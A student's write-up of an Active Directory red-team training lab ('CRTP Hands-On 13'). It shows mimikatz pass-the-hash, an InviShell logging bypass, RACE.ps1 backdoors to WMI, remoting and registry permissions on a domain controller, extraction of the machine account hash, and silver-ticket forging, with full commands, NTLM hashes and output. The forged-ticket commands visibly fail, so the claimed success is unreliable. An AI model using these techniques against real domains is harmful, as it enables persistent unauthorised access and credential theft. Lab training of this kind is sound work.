# CRTP Hands-On 13

```
  • Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.
  • Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.
```

Index :

  1. [Modify Security Descriptors](#modify-security-descriptors)
  2. [Sliver Ticket WMI Code Execution](#silver-ticket-wmi-code-execution)


## Modify Security Descriptors

With Domaina dmin privilges modify security descriptors on dcorp-dc for WMI access for the user student162:

```
C:\Windows\system32>REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "privilege::debug" "sekurlsa::pth /domain:dollarcorp.moneycorp.local /user:svcadmin /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /domain:dollarcorp.moneycorp.local /user:svcadmin /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd
user    : svcadmin
domain  : dollarcorp.moneycorp.local
program : cmd
impers. : no
NTLM    : b38ff50264b74508085d82c69794a4d8
  |  PID  820
  |  TID  4764
  |  LSA Process is now R/W
  |  LUID 0 ; 141462899 (00000000:086e8d73)
  \_ msv1_0   - data copy @ 000001D2F02B2070 : OK !
  \_ kerberos - data copy @ 000001D2F0514B08
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001D2EFD914A8 (32) -> null

mimikatz(commandline) # exit
Bye!
```
Ste-RemoteWMI:
```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\Windows\system32>set COR_ENABLE_PROFILING=1

C:\Windows\system32>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.

C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Import-Module C:\AD\Tools\RACE.ps1
PS C:\Windows\system32> Set-RemoteWMI -SamAccountName student162 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
VERBOSE: Existing ACL for namespace root\cimv2 is
O:BAG:BAD:(A;CIID;CCDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;LS)(A;CIID;CCDCRP;;;AU)
VERBOSE: Existing ACL for DCOM is
O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)(A;;CCD
CSW;;;S-1-15-3-1024-2405443489-874036122-4286035555-1823921565-1746547431-2453885448-3625952902-991631256)
VERBOSE: New ACL for namespace root\cimv2 is
O:BAG:BAD:(A;CIID;CCDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;LS)(A;CIID;CCDCRP;;;AU)(A;CI;CCDCLCSWRPWPR
CWD;;;S-1-5-21-719815819-3726368948-3917688648-5102)
VERBOSE: New ACL for DCOM
O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)(A;;CCD
CSW;;;S-1-15-3-1024-2405443489-874036122-4286035555-1823921565-1746547431-2453885448-3625952902-991631256)(A;;CCDCLCSWR
P;;;S-1-5-21-719815819-3726368948-3917688648-5102)
```
With student162 terminal:

```
PS C:\Users\student162> gwmi -Class win32_operatingsystem -ComputerName dcorp-dc


SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```

Set-PSRemoting (unstable I/O error):

```
Set-RemotePSRemoting -SamAccountName student162 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
[dcorp-dc.dollarcorp.moneycorp.local] Processing data from remote server dcorp-dc.dollarcorp.moneycorp.local failed with the following error
message: The I/O operation has been aborted because of either a thread exit or an application request. For more information, see the
about_Remote_Troubleshooting Help topic.
    + CategoryInfo          : OpenError: (dcorp-dc.dollarcorp.moneycorp.local:String) [], PSRemotingTransportException
    + FullyQualifiedErrorId : WinRMOperationAborted,PSSessionStateBroken
```
With student162 terminal:
```
PS C:\Users\student162> Enter-PSSession -ComputerName dcorp-dc
[dcorp-dc]: PS C:\Users\student162\Documents> whoami
dcorp\student162
[dcorp-dc]: PS C:\Users\student162\Documents> hostname
dcorp-dc
[dcorp-dc]: PS C:\Users\student162\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::20f3:6a81:3eb4:45cb%9
   IPv4 Address. . . . . . . . . . . : 172.16.2.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.2.254
[dcorp-dc]: PS C:\Users\student162\Documents>
```

Add registry backdoor:

```
PS C:\Windows\system32> Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student162 -Verbose
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : ] Using trustee username 'student162'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Remote registry is not running, attempting to start
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Attaching to remote registry through StdRegProv
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating ACE with Access Mask of 983103
(ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating the trustee WMI object with
user 'student162'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Applying Trustee to new Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Calling SetSecurityDescriptor on the key
 with the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and
AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating the trustee WMI object with user 'student162'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Applying Trustee to new Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Calling SetSecurityDescriptor on the key with the newly
created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating ACE with Access Mask of 983103 (ALL_ACCESS)
and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating the trustee WMI object with user 'student162'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Applying Trustee to new Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Calling SetSecurityDescriptor on the key with the newly
 created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and
 AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating the trustee WMI object with user 'student162'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Applying Trustee to new Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Calling SetSecurityDescriptor on the key with the newly
created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and
AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating the trustee WMI object with user 'student162'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Applying Trustee to new Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Calling SetSecurityDescriptor on the key with the newly
created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2
(CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Creating the trustee WMI object with user 'student162'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Applying Trustee to new Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SECURITY] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2
(CONTAINER_INHERIT_ACE)
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Creating the trustee WMI object with user 'student162'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Applying Trustee to new Ace
The property 'DACL' cannot be found on this object. Verify that the property exists and can be set.
At C:\AD\Tools\RACE.ps1:2268 char:13
+             $RegSD.DACL += $RegAce.PSObject.ImmediateBaseObject
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : PropertyNotFound

VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Calling SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SAM\SAM\Domains\Account] Backdooring completed for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Backdooring completed for system

ComputerName                        BackdoorTrustee
------------                        ---------------
dcorp-dc.dollarcorp.moneycorp.local student162

```

Obtain backdoor registry from domain controller account:

```
PS C:\Users\student162> Import-Module C:\AD\Tools\RACE.ps1
PS C:\Users\student162> Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
VERBOSE: Bootkey/SysKey : BAB78ACD91795C983AEF0534E0DB38C7
VERBOSE: LSA Key        : BDC807FEC0BB38EB0AE338451573904220F8B69404F719BDDB03F8618E84005C

ComputerName                        MachineAccountHash
------------                        ------------------
dcorp-dc.dollarcorp.moneycorp.local f3bbb80e23d4bb3617f78587e6a48520


```

## Sliver Ticket WMI Code Execution


Use the previous machine accounte hash in order to create Silver Tickets for WMI:

The first One is silver ticket for HOST service:

```
C:\AD\Tools\SafetyKatz.exe "privilege::debug" "kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f3bbb80e23d4bb3617f78587e6a48520 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f3bbb80e23d4bb3617f78587e6a48520 /startoffset:0 /endin:600 /renewmax:10080 /ptt
ERROR kuhl_m_kerberos_golden ; Missing user argument

mimikatz(commandline) # exit
Bye!
```

The second service required for WMI execution RPCSS:

```
C:\AD\Tools\SafetyKatz.exe "privilege::debug" "kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:f3bbb80e23d4bb3617f78587e6a48520 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:f3bbb80e23d4bb3617f78587e6a48520 /startoffset:0 /endin:600 /renewmax:10080 /ptt
ERROR kuhl_m_kerberos_golden ; Missing user argument

mimikatz(commandline) # exit
Bye!
```

Validate tickets:

```
C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> klist

Current LogonId is 0:0x7bc1b51

Cached Tickets: (2)

#0>     Client: student162 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 5/2/2023 1:56:39 (local)
        End Time:   5/2/2023 11:56:39 (local)
        Renew Time: 5/9/2023 1:56:39 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local

#1>     Client: student162 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: LDAP/dcorp-dc.dollarcorp.moneycorp.local/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 5/2/2023 1:56:40 (local)
        End Time:   5/2/2023 11:56:39 (local)
        Renew Time: 5/9/2023 1:56:39 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
``` 

Remote WMI execution:

```
 gwmi -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local


SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348


```
